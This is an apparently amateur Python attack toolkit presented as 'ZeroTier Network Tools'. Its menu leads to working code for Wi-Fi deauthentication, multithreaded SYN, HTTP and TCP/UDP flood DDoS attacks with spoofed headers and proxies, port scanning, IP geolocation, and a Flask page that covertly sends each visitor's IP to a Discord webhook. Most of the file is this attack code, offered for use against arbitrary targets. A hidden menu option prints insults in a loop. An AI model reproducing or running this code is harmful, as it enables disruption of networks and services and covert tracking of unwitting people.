import os
import time
from concurrent.futures import ThreadPoolExecutor
import socket
try:
    from scapy.all import ARP, Ether, sniff
except ImportError:
    os.system("pip install scapy")
import socket
import threading
import time
import random
import sys
import json
import urllib3
import os
import time
from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap
try:
    import requests
except ImportError:
    os.system("pip install requests")
import numpy
urllib3.disable_warnings()

CEND      = '\33[0m'
CBOLD     = '\33[1m'
CITALIC   = '\33[3m'
CURL      = '\33[4m'
CBLINK    = '\33[5m'
CBLINK2   = '\33[6m'
CSELECTED = '\33[7m'

CBLACK  = '\33[30m'
CRED    = '\33[31m'
CGREEN  = '\33[32m'
CYELLOW = '\33[33m'
CBLUE   = '\33[34m'
CVIOLET = '\33[35m'
CBEIGE  = '\33[36m'
CWHITE  = '\33[37m'

CBLACKBG  = '\33[40m'
CREDBG    = '\33[41m'
CGREENBG  = '\33[42m'
CYELLOWBG = '\33[43m'
CBLUEBG   = '\33[44m'
CVIOLETBG = '\33[45m'
CBEIGEBG  = '\33[46m'
CWHITEBG  = '\33[47m'

CGREY    = '\33[90m'
CRED2    = '\33[91m'
CGREEN2  = '\33[92m'
CYELLOW2 = '\33[93m'
CBLUE2   = '\33[94m'
CVIOLET2 = '\33[95m'
CBEIGE2  = '\33[96m'
CWHITE2  = '\33[97m'

CGREYBG    = '\33[100m'
CREDBG2    = '\33[101m'
CGREENBG2  = '\33[102m'
CYELLOWBG2 = '\33[103m'
CBLUEBG2   = '\33[104m'
CVIOLETBG2 = '\33[105m'
CBEIGEBG2  = '\33[106m'
CWHITEBG2  = '\33[107m'                                    


logogradient1 = '\033[38;2;221;255;196m\033[0m'
logogradient2 = '\033[38;2;213;252;174m\033[0m'
logogradient3 = '\033[38;2;182;255;128m\033[0m'
logogradient4 = '\033[38;2;171;255;110m\033[0m'
logogradient5 = '\033[38;2;159;255;89m\033[0m'
logogradient6 = '\033[38;2;147;255;69m\033[0m'
logogradient7 = '\033[38;2;134;252;48m\033[0m'
logogradient8 = '\033[38;2;113;252;32m\033[0m'

os.system("title ZeroTier™ Network Tools - By Elliot (starykapec)")

def logo():
    print("")
    print("\033[38;2;221;255;196m▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  \033[0m")
    print("\033[38;2;203;250;167m▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒\033[0m")
    print("\033[38;2;182;255;128m░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒\033[0m")
    print("\033[38;2;171;255;110m  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  \033[0m")
    print("\033[38;2;159;255;89m▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒ \033[0m")
    print("\033[38;2;147;255;69m░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows\033[0m")
    print("\033[38;2;134;252;48m░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)\033[0m")
    print("\033[38;2;113;252;32m░     ░        ░        ░             ░       ░         ░        v1.0       \033[0m"+CEND)
    print(CYELLOW+CBOLD+"════════════════════════════════════════════════════════════════════════════════"+CEND)

def menulogo():
    print("")
    print("\033[38;2;221;255;196m▒███████▒▓█████  ██▀███   ▒█████  ▄▄▄█████▓ ██▓▓█████  ██▀███  \033[0m")
    print("\033[38;2;190;255;166m▒ ▒ ▒ ▄▀░▓█   ▀ ▓██ ▒ ██▒▒██▒  ██▒▓  ██▒ ▓▒▓██▒▓█   ▀ ▓██ ▒ ██▒\033[0m")
    print("\033[38;2;182;255;128m░ ▒ ▄▀▒░ ▒███   ▓██ ░▄█ ▒▒██░  ██▒▒ ▓██░ ▒░▒██▒▒███   ▓██ ░▄█ ▒\033[0m")
    print("\033[38;2;171;255;110m  ▄▀▒   ░▒▓█  ▄ ▒██▀▀█▄  ▒██   ██░░ ▓██▓ ░ ░██░▒▓█  ▄ ▒██▀▀█▄  \033[0m")
    print("\033[38;2;159;255;89m▒███████▒░▒████▒░██▓ ▒██▒░ ████▓▒░  ▒██▒ ░ ░██░░▒████▒░██▓ ▒██▒ \033[0m")
    print("\033[38;2;147;255;69m░▒▒ ▓░▒░▒░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░▒░▒░   ▒ ░░   ░▓  ░░ ▒░ ░░ ▒▓ ░▒▓░  For Windows\033[0m")
    print("\033[38;2;134;252;48m░░▒ ▒ ░ ▒ ░ ░  ░  ░▒ ░ ▒░  ░ ▒ ▒░     ░     ▒ ░ ░ ░  ░  ░▒ ░ ▒░  By Elliot (ZeroTier™)\033[0m")
    print("\033[38;2;113;252;32m░     ░        ░        ░             ░       ░         ░        v1.0       \033[0m"+CEND)
    print(CYELLOW+CBOLD+"╔══════════════════════════════════════════════════════════════════════════════╗"+CEND)

                                        

def menuback():
    input(CYELLOW+CBOLD+"Click enter to go back to menu"+CEND)
    time.sleep(0)
    main()

def enddos():
    print("")

def main():
    os.system("cls")
    menulogo()
    print(CBOLD+CYELLOW+"╠ 1. GeoLocate IP                "+CEND+CBOLD+"Locates a device by their IP              "+CBOLD+CYELLOW+"    ║")
    print(CBOLD+CYELLOW+"╠ 2. Wifi Deauth attack          "+CEND+CBOLD+"Shutdowns network"+CBOLD+CYELLOW+"                             ║")
    print(CBOLD+CYELLOW+"╠ 3. TCP Port Scanner            "+CEND+CBOLD+"Scans ports for server IP"+CBOLD+CYELLOW+"                     ║")
    print(CBOLD+CYELLOW+"╠ 4. DDoS attacks                "+CEND+CBOLD+"Attacks IP with Distributed Denial of Service "+CBOLD+CYELLOW+"║")
    print(CBOLD+CYELLOW+"╠ 5. Ping Sweep                  "+CEND+CBOLD+"Ping multiple IPs to find active hosts"+CBOLD+CYELLOW+"        ║")
    print(CBOLD+CYELLOW+"╠ 6. Discord webhook IP grabber  "+CEND+CBOLD+"Grabs an user ip by using discord webhook"+CBOLD+CYELLOW+"     ║")
    print(CBOLD+CYELLOW+"╠ 7. Exit                        "+CEND+CBOLD+"Exits menu"+CBOLD+CYELLOW+"                                    ║")
    print(CBOLD+CYELLOW+"╚══════════════════════════════════════════════════════════════════════════════╝"+CEND)
    selectoption = int(input(CBLINK2+"> "+CEND))

    if selectoption == 1:
        import requests
        os.system("cls")
        logo()
        print("")
        print("Type in the IP")
        curlip = input("> ")
        print("")
        r = requests
        def findgeo():
            curledipapi = r.get(f"http://ipinfo.io/{curlip}").json()
            curledipapi2 = r.get(f"http://ip-api.com/json/{curlip}").json()
            os.system("cls")
            logo()
            print("")
            try:
                print(CYELLOW+CBOLD+"IP: " + curledipapi['ip'])
            except:
                print(CYELLOW+CBOLD+"IP: Invalid"+CEND)
            try:
                print("Status: " + curledipapi2['status'])
            except:
                print(CYELLOW+CBOLD+"Status: failed"+CEND)
            try:
                print("Host Name: " + curledipapi['hostname'])
            except:
                print(CYELLOW+CBOLD+"Host Nam: Not Found"+CEND)
            try:
                print("City: " + curledipapi['city'])
            except:
                print(CYELLOW+CBOLD+"City: Not Found"+CEND)
            try:
                print("Region: " + curledipapi['region'])
            except:
                print(CYELLOW+CBOLD+"Region: Not Found"+CEND)
            try:
                print("Country: " + curledipapi2['country'])
            except:
                print(CYELLOW+CBOLD+"Country: Not Found"+CEND)
            try:
                print("Geo Localization: " + curledipapi['loc'])
            except:
                print(CYELLOW+CBOLD+"Geo Localization: Not Found"+CEND)
            try:
                print("Org: " + curledipapi['org'])
            except:
                print(CYELLOW+CBOLD+"Org: Not Found"+CEND)
            try:
                print("Postal Code: " + curledipapi['postal'])
            except:
                print(CYELLOW+CBOLD+"Postal Code: Not Found"+CEND)
            try:
                print("Time Zone: " + curledipapi['timezone']+CEND)
            except:
                print(CYELLOW+CBOLD+"Time Zone: Not Found"+CEND)
            try:
                print(CYELLOW+CBOLD+"Geo Link: " + "https://www.google.pl/maps/place/" + curledipapi['loc'])
            except:
                print(CYELLOW+CBOLD+"Geo Link: Invalid"+CEND)
            print("")

            
            menuback()
        findgeo()

    elif selectoption == 2:
        mon = "mon"
        os.system("cls")
        logo()
        print("")
        print("Enter target AP")
        TARGET_AP = input("> ")
        print("Enter victim MAC")
        VICTIM_MAC = input("> ")
        print("Select interface (It has to be wireless)")
        INTERFACE = input("> ")
        print("Enter amount of packets")
        PACKET_COUNT = int(input("> "))

        
        """TARGET_AP = "FF:FF:FF:FF:FF:FF"  # Change to your target AP MAC (BSSID)
        VICTIM_MAC = "00:00:00:00:00:00"  # Change to victim MAC (use FF:FF:FF:FF:FF:FF for broadcast)
        INTERFACE = ""  # Change to your wireless interface (must be in monitor mode)
        PACKET_COUNT = 100  # Number of deauth packets to send """

        def spam_deauth():
            os.system("cls")
            logo()
            print("")
            print(CYELLOW+CBOLD+"Initiating deauthentication attack...")
            print(f"Target AP: {TARGET_AP}")
            print(f"Victim: {VICTIM_MAC}")
            print(f"Interface: {INTERFACE}")
            print(f"Packets: {PACKET_COUNT}"+CEND)
            print("")

            # Validate MAC addresses
            def is_valid_mac(mac):
                import re
                pattern = r'^([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})$'
                return re.match(pattern, mac) is not None
            
            if not is_valid_mac(TARGET_AP) or not is_valid_mac(VICTIM_MAC):
                print(CYELLOW+CBOLD+"Invalid MAC address format. Use format like: AA:BB:CC:DD:EE:FF"+CEND)
                time.sleep(2)
                main()
            
            try:
                packets_sent = 0
                
                while packets_sent < PACKET_COUNT:
                    try:
                        # Create deauthentication packet
                        # Method 1: To AP (target AP receives deauth for victim)
                        packet1 = RadioTap() / \
                                Dot11(type=0, subtype=12, addr1=TARGET_AP, addr2=VICTIM_MAC, addr3=TARGET_AP) / \
                                Dot11Deauth(reason=7)
                        
                        # Method 2: To victim (victim receives deauth from AP)
                        packet2 = RadioTap() / \
                                Dot11(type=0, subtype=12, addr1=VICTIM_MAC, addr2=TARGET_AP, addr3=TARGET_AP) / \
                                Dot11Deauth(reason=7)
                        
                        # Send both types of packets
                        sendp(packet1, iface=INTERFACE, count=1, verbose=False)
                        sendp(packet2, iface=INTERFACE, count=1, verbose=False)
                        
                        packets_sent += 2
                        
                        if packets_sent % 20 == 0:
                            print(f"Sent {packets_sent} deauth packets...")
                        
                        time.sleep(0.1)  # Small delay to avoid flooding
                        
                    except KeyboardInterrupt:
                        print("\nAttack stopped by user")
                        break
                    except Exception as e:
                        print(f"Error sending packet: {e}")
                        time.sleep(1)  # Wait before retrying
                
                print(f"\nAttack complete! Total packets sent: {packets_sent}")
            
            except PermissionError:
                print("Permission denied. Run as root/administrator!")
            except Exception as e:
                print(f"Error: {e}")

        if __name__ == "__main__":
            # Check if running as root
            if os.name == 'posix' and os.geteuid() != 0:
                print("This script must be run as root!")
                print("Try: sudo python3 deauth_attack.py")
                exit(1)
            
            # Check if Scapy is properly installed
            try:
                from scapy.layers.dot11 import Dot11Deauth
            except ImportError:
                print("Required modules not found.")
                print("Install Scapy: pip install scapy")
                exit(1)
            
            # Check if interface exists
            import subprocess
            try:
                result = subprocess.run(['ip', 'link', 'show', INTERFACE], 
                                    capture_output=True, text=True)
                if result.returncode != 0:
                    print(CYELLOW+CBOLD+f"Interface {INTERFACE} not found!")
                    print("Available interfaces:"+CEND)
                    subprocess.run(['ip', 'link', 'show'])
                    exit(1)
            except:
                pass  # If ip command fails, continue anyway
            
            spam_deauth()

    elif selectoption == 3:
        os.system("cls")
        logo()
        print("")
        # ========== CONFIGURATION ==========
        print("Enter IP you wanna scan")
        TARGET_IP = str(input("> "))
        print("Enter the end port (THE MOST IS 65535)")
        END_PORT = int(input("> "))
        print("")
        START_PORT = 1
        TIMEOUT = 0.5
        # ===================================

        def scan():
            os.system("cls")
            logo()
            print("")

            print(CYELLOW+CBOLD+f"Scanning {TARGET_IP} (ports {START_PORT}-{END_PORT})...\n"+CEND)
            open_ports = []
            for port in range(START_PORT, END_PORT + 1):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(TIMEOUT)

                try:
                    if sock.connect_ex((TARGET_IP, port)) == 0:
                        try:
                            service = socket.getservbyport(port)
                        except:
                            service = "unknown"
                        
                        print(f" Port {port}: OPEN ({service})")
                        open_ports.append(port)
                except:
                    pass
                finally:
                    sock.close()
            
            # Results summary
            print(f"\nFound {len(open_ports)} open ports")
            if open_ports:
                print("Open ports:", ", ".join(map(str, open_ports)))
                print("")
                menuback()
            

        if __name__ == "__main__":
            scan()


    elif selectoption == 4:
        os.system("cls")
        logo()
        print("")
        print(CYELLOW+CBOLD+"Select type of DDoS")
        print("[1] SYN Flood")
        print("[2] HTTP Flood")
        print("[3] TCP/UDP Flood")
        selectddos = int(input("> "))
        if selectddos == 1:
            print("")
            os.system("cls")
            logo()
            print("")
            print("Enter target IP")
            TARGET_IP = input("> ")
            print("Enter target TCP PORT")
            TARGET_PORT = int(input("> "))
            print("Enter target 3 ranges of IP")
            THREE_OF_FAKE = input("> ")
            FAKE_IPS = [THREE_OF_FAKE+"{}".format(i) for i in range(1, 255)]
            print("Enter Thread Count")  
            THREAD_COUNT = int(input("> "))
            print("Enter Attack Duration")
            ATTACK_DURATION = int(input("> "))
            os.system("cls")
            logo()
            print("")
            print(f"Attacking for {ATTACK_DURATION} seconds...")

            # Global flag to control the attack
            flooding = True

            def syn_flood():
                while flooding:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(1)
                        source_ip = random.choice(FAKE_IPS)
                        s.connect((TARGET_IP, TARGET_PORT))
                        s.send(bytes("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(source_ip), 'utf-8'))
                        s.close()
                    except:
                        pass

            print(f"Starting SYN Flood on {TARGET_IP}:{TARGET_PORT}")
            for i in range(THREAD_COUNT):
                thread = threading.Thread(target=syn_flood)
                thread.daemon = True  
                thread.start()
                time.sleep(0.01)

            time.sleep(ATTACK_DURATION)
            flooding = False
            print("Attack stopped.")

        elif selectddos == 2:
            os.system("cls")
            logo()
            print("")
            print("Enter target url")
            TARGET_URL = str(input("> "))

            print("Enter Threads Count")
            THREAD_COUNT = int(input("> "))

            print("Enter Requests per Thread")
            REQUESTS_PER_THREAD = int(input("> "))

            TIMEOUT = 5
            PROXY_MODE = False  # Set to True to use proxies

            # HTTP Headers List
            USER_AGENTS = [
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0",
                "Mozilla/5.0 (Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko)",
                "Chrome/51.0.2704.103 Safari/537.36",
                "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.12.388 Version/12.16",
                "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
                "Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; Intel Win64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
            ]

            REFERRERS = [
                "https://www.google.com/",
                "https://www.youtube.com/",
                "https://www.facebook.com/",
                "https://www.twitter.com/",
                "https://www.reddit.com/",
                "https://www.bing.com/",
                "https://www.yahoo.com/",
                "https://www.amazon.com/",
                "https://www.instagram.com/",
                "https://www.linkedin.com/"
            ]

            QUERY_PARAMS = [
                "id", "name", "page", "view", "server", "port", "host", "uri",
                "date", "term", "key", "value", "secret", "password", "username",
                "email", "phone", "address", "city", "state", "zip", "country"
            ]


            # Proxy list (optional)
            PROXY_LIST = [
                "http://103.216.51.210:8080",
                "http://45.64.75.211:8080",
                "http://103.89.253.249:8080",
                "http://47.245.54.178:8080",
                "http://103.156.17.69:8080"
            ]

            def generate_fake_ip():
                """Generate random IP address"""
                return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

            def generate_fake_request():
                """Generate fake HTTP request"""
                methods = ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"]
                method = random.choice(methods)
                
                # Generate random path and query params
                path = "/" + "/".join([random.choice(QUERY_PARAMS) for _ in range(random.randint(1,5))])
                
                if random.random() > 0.5:
                    param = random.choice(QUERY_PARAMS)
                    value = random.choice(["value", "test", "null", "undefined", "true", "false"])
                    path += f"?{param}={value}"
                
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Referer": random.choice(REFERRERS),
                    "X-Forwarded-For": generate_fake_ip(),
                    "X-Real-IP": generate_fake_ip(),
                    "Cache-Control": "no-cache",
                    "Pragma": "no-cache"
                }
                
                if method == "POST":
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    body = f"{random.choice(QUERY_PARAMS)}={random.choice(['test','false','null','undefined'])}"
                else:
                    body = None
                
                return method, path, headers, body

            def http_flooder(thread_id):
                """Main HTTP flooding thread"""
                print(f"[Thread-{thread_id}] Starting attack...")
                
                success_count = 0
                failure_count = 0
                
                for i in range(REQUESTS_PER_THREAD):
                    try:
                        if PROXY_MODE and PROXY_LIST:
                            proxy = random.choice(PROXY_LIST)
                            proxy_dict = {"http": proxy, "https": proxy}
                        else:
                            proxy_dict = None
                        
                        method, path, headers, body = generate_fake_request()
                        full_url = f"{TARGET_URL}{path}"
                        
                        response = requests.request(
                            method,
                            full_url,
                            headers=headers,
                            data=body,
                            timeout=TIMEOUT,
                            proxies=proxy_dict,
                            verify=False
                        )
                        
                        success_count += 1
                        if i % 50 == 0:
                            print(f"[Thread-{thread_id}] Sent {success_count} requests, failed: {failure_count}")
                    
                    except Exception as e:
                        failure_count += 1
                        if failure_count % 100 == 0:
                            print(f"[Thread-{thread_id}] Errors: {failure_count}")
                        continue
                
                print(f"[Thread-{thread_id}] Finished: {success_count} success, {failure_count} failed")

            def start_auto_attack():

                print(f"Target: {TARGET_URL}")
                print(f"Threads: {THREAD_COUNT}")
                print(f"Requests per thread: {REQUESTS_PER_THREAD}")
                print(f"Proxy Mode: {PROXY_MODE}")
                print(f"Request timeout: {TIMEOUT}s\n")
                
                countdown = 0
                for i in range(countdown, 0, -1):
                    os.system("cls")
                    logo()
                    print("")
                    print(f"Starting in {i} seconds...")
                    time.sleep(1)
                
                # Start all threads
                threads = []
                start_time = time.time()
                
                for i in range(THREAD_COUNT):
                    t = threading.Thread(target=http_flooder, args=(i,))
                    t.daemon = True
                    t.start()
                    threads.append(t)
                    time.sleep(0.01)  # Stagger start
                
                # Monitor
                try:
                    while True:
                        command = input("> ")
                        if command.lower() == "stop":
                            break
                        if command.lower() == "stats":
                            print(f"Threads active: {len([t for t in threads if t.is_alive()])}")
                        if command.lower() == "exit":
                            break
                        else:
                            print("Commands: stop, stats, exit")
                except KeyboardInterrupt:
                    pass
                
                end_time = time.time()
                time_elapsed = end_time - start_time
                
                print(f"\nAttack completed in {time_elapsed:.2f} seconds")
                print("Terminating all threads...")
                
                # Cleanup
                time.sleep(1)
                print("Script ended")
                main()

            if __name__ == "__main__":
                # Check requests is installed
                try:
                    import requests
                except ImportError:
                    sys.exit(1)
                
                # Start attack
                start_auto_attack()

        elif selectddos == 3:
            os.system("cls")
            logo()
            print("")
            print(CRED+CBOLD+"Warning! The attack might be so powerful on single device,")
            print("that it might crash your Wifi!"+CEND)
            print("")
            
            class FloodAttack:
                def __init__(self, target_ip, target_port, attack_type="both"):
                    self.target_ip = target_ip
                    self.target_port = target_port
                    self.attack_type = attack_type
                    self.threads = []
                    self.running = False
                    
                def create_tcp_packet(self):
                    packet = random._urandom(2048)
                    return packet
                
                def create_udp_packet(self):
                    packet = random._urandom(2048)
                    return packet
                
                def tcp_flood(self):
                    while self.running:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            sock.settimeout(1)
                            sock.connect((self.target_ip, self.target_port))
                            packet = self.create_tcp_packet()
                            sock.send(packet)
                            sock.close()
                        except:
                            pass
                
                def udp_flood(self):
                    while self.running:
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            packet = self.create_udp_packet()
                            sock.sendto(packet, (self.target_ip, self.target_port))
                            sock.close()
                        except:
                            pass
                
                def start(self, thread_count=100):
                    self.running = True
                    print(f"Starting attack on {self.target_ip}:{self.target_port}")
                    print(f"Attack type: {self.attack_type}")
                    print(f"Threads: {thread_count}")
                    
                    for _ in range(thread_count):
                        if self.attack_type == "tcp" or "TCP" or "Tcp" or self.attack_type == "both":
                            thread = threading.Thread(target=self.tcp_flood)
                            thread.daemon = True
                            self.threads.append(thread)
                            thread.start()
                            
                        if self.attack_type == "udp" or "UDP" or "Udp" or self.attack_type == "both":
                            thread = threading.Thread(target=self.udp_flood)
                            thread.daemon = True
                            self.threads.append(thread)
                            thread.start()
                    
                    print("Attack running... Press Ctrl+C to stop")
                    try:
                        while self.running:
                            time.sleep(1)
                    except KeyboardInterrupt:
                        self.stop()
                
                def stop(self):
                    print("\nStopping attack...")
                    self.running = False
                    time.sleep(2)

            def main():
                # Configuration - edit these values
                print("Entet target IP")
                target_ip = input("> ")  # Change to target IP
                print(f"Enter {target_ip} Port")
                target_port = int(input("> "))
                print("Choose attack type "+CYELLOW+CBOLD+"[UDP, TCP, BOTH]"+CEND)              # Change to target port
                attack_type = str(input("> "))          # "tcp", "udp", or "both"
                print("Enter threads amount")
                thread_count = int(input("> "))            # Number of threads
                
                # Initialize and start attack
                attack = FloodAttack(target_ip, target_port, attack_type)
                attack.start(thread_count)

            if __name__ == "__main__":
                main()

    elif selectoption == 5:
        os.system("cls")
        logo()
        print("")
        print("Enter website url")
        weburl = input("> ")
        print(CYELLOW+CBOLD+"")
        os.system("nslookup {weburl}"+CEND)

    elif selectoption == 6:
        from flask import Flask, request, redirect
        from datetime import datetime
        import requests

        app = Flask(__name__)

        os.system("cls")
        logo()
        print("")
        print("Enter discord webhook url")
        webhook_url = input("> ")
        def send_ip(ip, date):
            data = {
                "content": "",
                "title": "ZeroTier IPLOGGER"
            }
            data["embeds"] = [
                {
                    "title": ip,
                    "description": date
                }
            ]
            requests.post(webhook_url, json=data)
        @app.route("/")
        def index():
            ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
            date = datetime.today().strftime("%Y-%m-%d %H:%M:%S")

            send_ip(ip, date)

            return redirect("https://google.com")
        
        if __name__ == "__main__":
            app.run(host='0.0.0.0')

    elif selectoption == 7:
        print("")
        print("Exiting...")
        time.sleep(1)
        os.system("cls")
        exit()

    elif selectoption == 213769:
        a = 6
        b = 7
        c = 67
        print(f"{a} + {b} = {c}")
        for i in range(10000000):
            print("Ten komputer jest niewykrywalny ty FBIjajska ździro essa monessa z wami frajerzy")
            print("siemanko tutaj multi")

    else:
        os.system("cls")
        logo()
        print("")
        print(CGREEN+CBOLD+"Chose a valid option!"+CEND)
        time.sleep(1.5)
        main()
main()
